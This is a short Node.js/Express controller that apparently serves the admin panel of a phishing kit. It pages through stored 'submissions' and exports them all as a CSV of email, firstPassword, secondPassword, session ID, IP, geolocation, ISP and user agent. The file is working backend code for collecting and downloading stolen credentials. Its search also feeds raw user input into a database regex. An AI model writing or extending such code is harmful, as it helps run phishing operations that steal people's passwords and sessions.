// controllers/adminSubmissionsController.js
import Submission from "../models/Submission.js";
import { Parser as Json2csvParser } from "json2csv";

export async function getSubmissions(req, res) {
  const page = parseInt(req.query.page) || 1;
  const limit = 20;
  const search = req.query.search || "";

  const query = search
    ? { email: { $regex: search, $options: "i" } }
    : {};

  const [submissions, total] = await Promise.all([
    Submission.find(query)
      .sort({ time: -1 })
      .skip((page - 1) * limit)
      .limit(limit)
      .lean(),
    Submission.countDocuments(query)
  ]);

  res.json({
    submissions,
    total,
    page,
    pages: Math.ceil(total / limit)
  });
}

export async function exportSubmissionsCSV(req, res) {
  const submissions = await Submission.find().sort({ time: -1 }).lean();

  const fields = [
    "email",
    "firstPassword",
    "secondPassword",
    "sessionID",
    "ip",
    "country",
    "city",
    "isp",
    "userAgent",
    "time"
  ];

  const parser = new Json2csvParser({ fields });
  const csv = parser.parse(submissions);

  res.header("Content-Type", "text/csv");
  res.attachment("submissions.csv");
  return res.send(csv);
}